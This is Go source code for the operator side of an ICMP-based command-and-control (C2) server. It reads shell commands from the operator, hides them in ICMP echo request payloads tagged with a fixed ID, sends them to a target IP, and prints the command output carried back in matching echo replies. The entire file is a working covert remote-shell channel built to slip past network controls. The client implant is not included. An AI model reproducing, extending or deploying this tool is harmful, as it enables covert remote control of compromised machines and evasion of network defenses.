package main

import (
    "flag"
    "fmt"
    "net"
    "os"
    "os/signal"
    "syscall"
    "golang.org/x/net/icmp"
    "golang.org/x/net/ipv4"
    "bufio"
)

const (
    ICMPID uint16 = 13170
)

var (
    interfaceName   = flag.String("i", "", "Listener (virtual) Network Interface (e.g. eth0)")
    destinationIP   = flag.String("d", "", "Destination IP address")
    stopSignal      = make(chan os.Signal, 1)
    icmpShellPacket = make(chan []byte)
)

func checkError(err error) {
    if err != nil {
        fmt.Fprintf(os.Stderr, "Error: %v\n", err)
        os.Exit(1)
    }
}

func sendICMPRequest(conn *icmp.PacketConn, destAddr *net.IPAddr, command string) {
    // Construct an ICMP Echo Request packet with the command as payload
    msg := icmp.Message{
        Type: ipv4.ICMPTypeEcho, // Note: You can use ipv4.ICMPTypeEcho instead of icmp.Echo.
        Code: 0,
        Body: &icmp.Echo{
            ID:   int(ICMPID),
            Data: []byte(command),
        },
    }

    msgBytes, err := msg.Marshal(nil)
    checkError(err)

    // Send the ICMP Echo Request packet to the client
    _, err = conn.WriteTo(msgBytes, destAddr)
    checkError(err)
}

func sniffer() {
    conn, err := icmp.ListenPacket("ip4:icmp", *interfaceName)
    checkError(err)
    defer conn.Close()

    for {
        buf := make([]byte, 1500)
        n, _, err := conn.ReadFrom(buf)
        checkError(err)

        // Parse the incoming ICMP packet
        msg, err := icmp.ParseMessage(1, buf[:n])
        checkError(err)

        // Check if it's an Echo Reply packet with the correct ID
        if echo, ok := msg.Body.(*icmp.Echo); ok && msg.Type == ipv4.ICMPTypeEchoReply && echo.ID == int(ICMPID) {
            icmpShellPacket <- echo.Data
        }
    }
}

func main() {
    flag.Parse()

    if *interfaceName == "" || *destinationIP == "" {
        fmt.Println("Please provide both interface and destination IP address.")
        os.Exit(1)
    }

    go sniffer()

    signal.Notify(stopSignal, os.Interrupt, syscall.SIGTERM)

    fmt.Println("[+] ICMP C2 started!")

    // Start reading user input for commands
    go func() {
        scanner := bufio.NewScanner(os.Stdin)
        for {
            fmt.Print("Enter command: ")
            if scanner.Scan() {
                command := scanner.Text()
                conn, err := icmp.ListenPacket("ip4:icmp", *interfaceName)
                checkError(err)

                destAddr, err := net.ResolveIPAddr("ip4", *destinationIP)
                checkError(err)

                sendICMPRequest(conn, destAddr, command)
                conn.Close()
                fmt.Println("[+] Command sent to the client:", command)
            }
        }
    }()

    for {
        select {
        case icmpShell := <-icmpShellPacket:
            fmt.Print(string(icmpShell))
        case <-stopSignal:
            fmt.Println("[+] Stopping ICMP C2...")
            return
        }
    }
}

